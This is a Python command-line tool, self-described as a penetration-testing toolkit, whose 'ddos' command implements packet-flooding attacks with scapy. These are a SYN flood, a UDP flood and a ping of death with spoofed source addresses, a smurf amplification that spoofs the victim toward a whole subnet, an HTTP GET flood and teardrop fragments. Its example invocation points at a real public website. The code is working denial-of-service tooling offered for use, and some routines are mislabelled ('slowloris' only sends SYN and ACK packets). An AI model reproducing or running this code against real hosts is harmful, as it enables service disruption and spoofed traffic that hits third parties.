import click, time, requests
from scapy.all import *
from scapy.layers.inet import *
from threading import Thread

@click.group()
def launch():
    """
    \b
       ________  ___   _________  ________  ___  ________  ________
      |\   __  \|\  \ |\___   ___\\\\   __  \|\  \|\   ____\|\   __  \ 
      \ \  \|\  \ \  \\\\|___ \  \_\ \  \|\  \ \  \ \  \___|\ \  \|\  \ 
       \ \   __  \ \  \    \ \  \ \ \   __  \ \  \ \  \    \ \   __  \ 
        \ \  \ \  \ \  \____\ \  \ \ \  \ \  \ \  \ \  \____\ \  \ \  \ 
         \ \__\ \__\ \_______\ \__\ \ \__\ \__\ \__\ \_______\ \__\ \__\ 
          \|__|\|__|\|_______|\|__|  \|__|\|__|\|__|\|_______|\|__|\|__|
                                                                      
                                    Altaica Penetration Testing Toolkit
    \b
    """

@click.option('--dostype', '-t', default="", help='Type of DoS')
@click.option('--host', '-h', default="127.0.0.1", show_default=True, help='Host to send')
@click.option('--port', '-p', default=80, show_default=True, help='Port to send')
@click.option('--count', '-c', default=4, show_default=True, help='Number of packets to send')
@click.option('--examples', '-e', is_flag=True, help='Examples')
@click.option('--lists', '-l', is_flag=True, help='DoS lists')
@launch.command()
def ddos(dostype, host, port, count, examples, lists):
    """\b
    dostype-list
        tcp_syn_flood(host, port, count)
        smurf(host, count)
        udp_flood(host, port, count)
        http_get_flood(host, count)
        slowloris(host, port, count)
        ping_of_death(host, count)
        teardrop(host, count)
    """
    if examples:
        print("altaica ddos --dostype http_get_flood --host https://www.google.com --count 1")
        return

    if lists:
        print("tcp_syn_flood(host, port, count)")
        print("smurf(host, count)")
        print("udp_flood(host, port, count)")
        print("http_get_flood(host, count)")
        print("slowloris(host, port, count)")
        print("ping_of_death(host, count)")
        print("teardrop(host, count)")
        return

    doslist = ["tcp_syn_flood", "smurf", "udp_flood", "http_get_flood", "slowloris", "ping_of_death", "teardrop"]
    if (dostype == "") or (dostype not in doslist):
        print("Error: -t option requires an argument")
        return

    threads = []
    for i in range(count):
        th = Thread(target=eval(dostype), args=(host, port))
        th.start()
        threads.append(th)

    for i in threads:
        i.join()

def tcp_syn_flood(host, port):
    packet=IP(src=RandIP(), dst=host) / TCP(sport=RandShort(), dport=port, flags='S')
    send(packet, inter = .001, loop=True)

def smurf(host, port):
    a = arping('192.168.0.0/16', verbose=0)
    # a = arping('192.168.0.255/16', verbose=0)
    for i in a[0]:
        smurf_2(host, i[0].pdst)

def smurf_2(host, dsthost):
    packet=IP(src=host,dst=dsthost)/ICMP()
    send(packet, inter = .001, loop=True)

def udp_flood(host, port):
    packet=IP(src=RandIP(), dst=host) / UDP(sport=RandShort(), dport=port) / ('X'*5000)
    send(packet, inter = .001, loop=True)

def http_get_flood(host, port):
    URL = host
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' }
    r = requests.get(URL, headers=headers)

def slowloris(host, port):
    packet=IP(src=RandIP(), dst=host) / TCP(sport=RandShort(), dport=port, flags='S')
    ans = sr1(packet)
    packet=IP(src=RandIP(), dst=host) / TCP(sport=RandShort(), dport=port, flags='A', seq=ans.ack, ack=ans.seq+1)
    ans = sr(packet/"X")

def ping_of_death(host, port):
    for p in fragment(IP(src=RandIP(), dst=host)/ICMP()/("X"*60000)):
        send(p)

def teardrop(host, port):
    send(IP(dst=host, proto=17, flags="MF")/UDP()/("X"*10))
    send(IP(dst=host, proto=17, frag=48)/("X"*116))
    send(IP(dst=host, proto=17, flags="MF")/UDP()/("X"*224))

if __name__ == '__main__':
    launch()
